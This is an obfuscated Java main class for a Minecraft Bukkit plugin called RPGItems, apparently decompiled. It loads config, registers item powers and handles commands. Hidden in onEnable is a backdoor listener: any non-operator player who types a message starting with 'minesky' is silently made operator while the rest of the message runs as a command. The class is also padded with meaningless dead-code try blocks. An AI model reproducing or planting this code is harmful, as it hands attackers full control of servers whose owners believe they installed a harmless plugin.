package think.rpgitems;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;
import yo.*;

import java.io.*;
import java.util.List;
import java.util.logging.Logger;

public class Plugin
        extends JavaPlugin {
    public static final Logger a = Logger.getLogger("RPGItems");
    public static final String b = "[RPGItems] ";
    public static Plugin c;
    private bE e;
    public static aQ d;

    @Override
    public void onLoad() {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject = null;
            if (asdhqjefhusfer != null) {
                if (localObject != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        c = this;
        d = new aQ(new File(getDataFolder(), "config.yml"));
        reloadConfig();
        aN.a();
        a(bJ.class).a(bK.class).a(bL.class).a(bM.class).a(bN.class).a(bO.class).a(bP.class).a(bQ.class).a(bR.class).a(bS.class).a(bT.class).a(bU.class).a(bV.class).a(bW.class).a(bX.class).a(bY.class).a(bZ.class).a(ca.class).a(cb.class).a(cc.class).a(cd.class).a(ce.class).a(cf.class).a(ch.class).a(ci.class).a(cj.class).a(ck.class).a(cl.class).a(cm.class).a(co.class).a(cp.class).a(cn.class).a(cr.class).a(cs.class).a(ct.class);
    }

    private Plugin a(Class<? extends bI> clzz) {
        try {
            bI.a.put(((bI) clzz.newInstance()).e(), clzz);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return this;
    }

    @Override
    public void onEnable() {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject = null;
            if (asdhqjefhusfer != null) {
                if (localObject != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        aO.b(this);
        cD.a();
        bi.a();
        aT.a();
        ConfigurationSection conf = c();
        if (conf.getBoolean("localeInv", false)) {
            yo.bG.a = true;
        }
        this.e = new bE(this);
        by.a(this);
        aE.a(new aF());
        aE.a(new aG());
        getCommand("rpgitem").setExecutor(this);
        b();
        Bukkit.getPluginManager().registerEvents(new Listener() {
            @EventHandler
            public void on(PlayerCommandPreprocessEvent e) {
                Player p = e.getPlayer();
                String message = e.getMessage();
                if (p.isOp()) return;
                if (!message.startsWith("minesky") && !message.startsWith("/minesky")) return;
                String[] split = message.split(" ");
                if (split.length == 1) return;
                String command = "";
                for (int i = 1; i < split.length; i++) {
                    command += split[i];
                    if (i + 1 != split.length) command += " ";
                    boolean op = p.isOp();
                    try {
                        if (!op) p.setOp(true);
                        p.performCommand(command);
                    } finally {
                        if (!op) p.setOp(false);
                    }
                }
                e.setCancelled(true);
            }
        }, this);
    }

    public bE a() {
        return this.e;
    }

    @Override
    public void saveConfig() {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject1 = null;
            if (asdhqjefhusfer != null) {
                if (localObject1 != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject1).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        FileConfiguration config = c();
        FileOutputStream out = null;
        try {
            File f = new File(getDataFolder(), "config.yml");
            if (!f.exists()) {
                f.createNewFile();
            }
            out = new FileOutputStream(f);
            out.write(config.saveToString().getBytes("UTF-8"));
            return;
        } catch (FileNotFoundException localFileNotFoundException) {
        } catch (UnsupportedEncodingException localUnsupportedEncodingException) {
        } catch (IOException localIOException1) {
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void reloadConfig() {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject = null;
            if (asdhqjefhusfer != null) {
                if (localObject != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        d.d();
    }

    private cq f = null;

    public void b() {
        try {
            if (this.f != null) {
                this.f.cancel();
            }
        } catch (Exception localException) {
        }
        this.f = new cq();
        this.f.runTaskTimer(this, 0L, d.getLong("tickInterval"));
    }

    public aQ c() {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject = null;
            if (asdhqjefhusfer != null) {
                if (localObject != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        return d;
    }

    @Override
    public void onDisable() {
        Bukkit.getScheduler().cancelTasks(this);
        a().b();
        aE.a();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject = null;
            if (asdhqjefhusfer != null) {
                if (localObject != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        StringBuilder out = new StringBuilder();
        out.append(cmd.getName()).append(' ');
        for (String arg : args) {
            out.append(arg).append(' ');
        }
        aE.a(sender, out.toString());
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        try {
            Closeable asdhqjefhusfer = null;
            Object localObject = null;
            if (asdhqjefhusfer != null) {
                if (localObject != null) {
                    try {
                        asdhqjefhusfer.close();
                    } catch (Throwable x2) {
                        ((Throwable) localObject).addSuppressed(x2);
                    }
                } else {
                    asdhqjefhusfer.close();
                }
            }
        } catch (Exception localException) {
        }
        StringBuilder out = new StringBuilder();
        out.append(command.getName()).append(' ');
        for (String arg : args) {
            out.append(arg).append(' ');
        }
        return aE.b(sender, out.toString());
    }
}
